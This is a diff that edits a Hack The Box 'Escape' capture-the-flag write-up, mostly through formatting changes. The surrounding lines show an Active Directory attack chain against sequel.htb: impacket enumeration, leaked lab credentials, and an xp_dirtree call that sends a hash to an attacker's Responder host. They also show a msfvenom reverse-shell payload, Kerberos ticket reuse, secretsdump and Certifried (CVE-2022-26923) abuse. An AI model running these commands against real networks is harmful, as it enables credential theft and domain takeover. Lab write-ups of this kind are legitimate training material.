@@ -13,21 +13,25 @@ category: "Writeups"
 ```bash
 impacket-smbclient sequel.htb/anonymous@sequel.htb -no-pass -dc-ip 10.129.25.121
 ```
-- need to figure out CME but anonymous logon lets us into the Public share to download a SQL Server Procedure pdf
-- User -> Ryan ? Tom ? Brandon ?
+Information pulled from the document pulled in the Public share / SQL Server Procedure PDF:
+
 - Accessing SQL db from non-domain machine:
 
 ```windows
 cmdkey /add:"servername.sequel.htb" /user:"sequel\username" /pass:"password"
 ```
-- We find some basic creds for new hires - PublicUser : GuestUserCantWrite1
+- We find some basic creds for new hires:
+
+```text
+ PublicUser : GuestUserCantWrite1
+```
 
 # MSSQL
 ```bash
 impacket-mssqlclient sequel.htb/PublicUser@dc.sequel.htb -dc-ip 10.129.25.121
 ```
 
-- [Using the hacktricks guide, we can use responder to connect back to our machine and capture a hash](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual)
+[Using the hacktricks guide, we can use responder to connect back to our machine and capture a hash](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual)
 
 ```bash
 exec master.dbo.xp_dirtree '\\10.10.14.91\share'
@@ -35,7 +39,7 @@ exec master.dbo.xp_dirtree '\\10.10.14.91\share'
 
 ![sql_sequel_responder.png](/images/HTB/Escape/sql_sequel_responder.png)
 
-```
+```text
 sql_svc : REGGIE1234ronnie
 ```
 
@@ -47,6 +51,7 @@ sql_svc : REGGIE1234ronnie
 ```bash
 impacket-GetADUsers 'sequel.htb/sql_svc' -all -debug -dc-ip 10.129.25.121
 ```
+Output:
 
 ```bash
 Administrator
@@ -81,7 +86,7 @@ KRB5CCNAME=Administrator.ccache impacket-mssqlclient sequel.htb/Administrator@dc
 ```
 ![mssql_admin_login.png](/images/HTB/Escape/mssql_admin_login.png)
 
-- DO NOT FORGET TO SYNC TIME FOR KERBEROS
+- Note: DO NOT FORGET TO SYNC TIME FOR KERBEROS
 
 ```bash
 sudo ntpdate <dc ip>
@@ -118,7 +123,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f e
 ```
 
 - Some templates of interest - Workstation, Machine
-- [Might be the route?](https://medium.com/@shaunwhorton/certifried-bloodhound-active-directory-certificate-services-abuse-f28850ffefc9)
+- [Certifried might be the route?](https://medium.com/@shaunwhorton/certifried-bloodhound-active-directory-certificate-services-abuse-f28850ffefc9)
 
 ## More Enumeration
 - We might still need to be Ryan.Cooper
@@ -167,10 +172,12 @@ impacket-wmiexec 'sequel.htb/administrator@10.10.11.202' -shell-type powershell 
 
 ![secretsdump.png](/images/HTB/Escape/secretsdump.png)
 
-## Another Route
+## Another Route (After Getting Administrator)
 # Certifried - CVE 2022-26923
 - Following the article above, we can take advantage of the certifried issue but first we need to change the machine account quota on the DC
 - [Link to article](https://medium.com/@shaunwhorton/certifried-bloodhound-active-directory-certificate-services-abuse-f28850ffefc9)
+
+Note: *This would have worked if the Machine Account Qutoa was configured* 
 
 ```powershell-session
 Set-ADDomain -Identity sequel.htb -Replace @{"ms-DS-MachineAccountQuota"="5"}
